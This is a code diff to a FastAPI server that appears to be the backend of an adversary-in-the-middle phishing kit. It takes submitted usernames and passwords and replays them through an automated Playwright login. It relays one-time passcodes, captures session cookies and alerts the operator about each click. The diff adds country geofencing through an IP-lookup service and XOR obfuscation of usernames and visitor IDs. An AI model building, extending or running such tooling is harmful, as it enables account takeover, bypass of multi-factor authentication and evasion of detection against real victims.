@@ -19,7 +19,7 @@ import requests
 import time
 import os
 from fastapi.security import APIKeyHeader
-from utils import messageAdmin, CONFIG, logger, DEBUG
+from utils import messageAdmin, CONFIG, logger, DEBUG, xorString
 
 # import modules.auto_login
 from modules.auto_login_playwright import auto_login
@@ -43,7 +43,13 @@ else:
 app.mount("/api", app)
 
 
-# --- Request Logger Middleware ---
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(message)s",
+    handlers=[logging.FileHandler("requests.log")],  # No StreamHandler
+)
+
+
 class RequestLoggerMiddleware(BaseHTTPMiddleware):
     async def dispatch(self, request: Request, call_next):
         try:
@@ -63,12 +69,7 @@ class RequestLoggerMiddleware(BaseHTTPMiddleware):
             "body": body_data,
         }
 
-        logging.basicConfig(
-            level=logging.INFO,
-            format="%(asctime)s - %(message)s",
-            handlers=[logging.FileHandler("requests.log"), logging.StreamHandler()],
-        )
-        logging.info(json.dumps(log_data, indent=2))
+        logging.info(json.dumps(log_data))
         response = await call_next(request)
         return response
 
@@ -176,6 +177,20 @@ def ipBlockCheck(
 ):
     if crud.check_IfIPBlocked(db, ip):
         return {"stats": "blocked"}
+
+    whitelist = crud.get_country_whitelist(db)
+    if len(whitelist):
+        try:
+            r = requests.get(f"http://ip-api.com/json/{ip}")
+            ip_stats = r.json()
+            # print(crud.get_country_whitelist(db))
+            if any(ip_stats["country"] == col.country for col in whitelist):
+                return {"stats": "not"}
+            else:
+                return {"stats": "blocked"}
+
+        except:
+            pass
     return {"stats": "not"}
 
 
@@ -192,7 +207,7 @@ def login(
     item: schemas.Login,
     db: Session = Depends(get_db),
 ):
-
+    item.username = xorString(item.username)
     # if only user was sent
     if item.password == "NONE":
         admin_message = (
@@ -257,6 +272,15 @@ def auto_mode_func_listner(q, request, id):
         if curr_stat["msg"] == "OTP_code":
             set_OPT_abstracted(id=id, OTP=curr_stat["data"])
             set_action_abstracted(id=id, action="OTP")
+        elif curr_stat["msg"] == "Invalid password":
+            set_action_abstracted(id=id, action="invalid")
+        elif curr_stat["msg"] == "Getting cookies":
+            set_action_abstracted(id=id, action="dummyPage")
+        elif curr_stat["msg"] == "Invalid username":
+            set_action_abstracted(id=id, action="invalid")
+        elif curr_stat["msg"] == "OTP_timeout":
+            set_action_abstracted(id=id, action="timeout")
+
         if curr_stat["type"] == "internal":
             if curr_stat["msg"] == "cookies":
                 db: Session = next(get_db())
@@ -314,14 +338,47 @@ def set_action(
     return set_action_abstracted(id, action)
 
 
+@app.put("/country/whitelist/{country}", dependencies=[Depends(get_api_key)])
+def set_country_whitelist(
+    country: str,
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    crud.set_country_whitelist(db, country)
+    return {"Status": "Done"}
+
+
+@app.get("/country/whitelist/all", dependencies=[Depends(get_api_key)])
+def get_country_whitelist(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    db_country_whitelist = crud.get_country_whitelist(db)
+    if not db_country_whitelist:
+        return ""
+
+    # return only with
+    return db_country_whitelist
+
+
+@app.get("/country/whitelist/remove", dependencies=[Depends(get_api_key)])
+def remove_country_whitelist(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    db_country_whitelist = crud.remove_country_whitelist(db)
+    return db_country_whitelist
+
+
 @app.put("/visit/{id}")
 def set_visitor(
     id: str,
     request: Request,
     db: Session = Depends(get_db),
 ):
+    id = xorString(id)
     crud.set_visitor(db, id)
-    admin_message = f"----\n click from: \n id: {id} \n----"
+    admin_message = f"----\n click from: {id} \n----"
 
     messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
     messageadmin_thread.start()
